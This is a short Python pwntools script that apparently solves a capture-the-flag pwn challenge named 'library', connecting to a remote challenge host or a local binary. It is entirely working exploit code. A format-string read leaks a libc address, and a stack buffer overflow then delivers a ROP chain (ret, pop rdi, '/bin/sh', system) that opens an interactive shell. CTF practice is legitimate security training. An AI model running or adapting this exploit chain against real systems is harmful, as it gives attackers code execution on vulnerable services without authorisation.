#!/usr/bin/python3

from pwn import *

exe = ELF('source', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
				b* 0x00000000004013f0

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('ehc-library-8479e7a0.dailycookie.cloud', 30849)
else:
        p = process(exe.path)

GDB()

def option4(payload):
    sla(b"option: ", b"4")
    sla(b">", payload)

option4(b"%19$p")
p.recvuntil(b"book: \n")
libc_leak = int(p.recvline(keepends=False), 16)
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x29d90
info("libc base: " + hex(libc.address))

payload = b"".ljust(56) + flat(
    libc.address + 0x0000000000029cd6, 
	libc.address + 0x000000000002a3e5, next(libc.search(b"/bin/sh")) ,libc.sym['system']
)
option4(payload)
p.interactive()
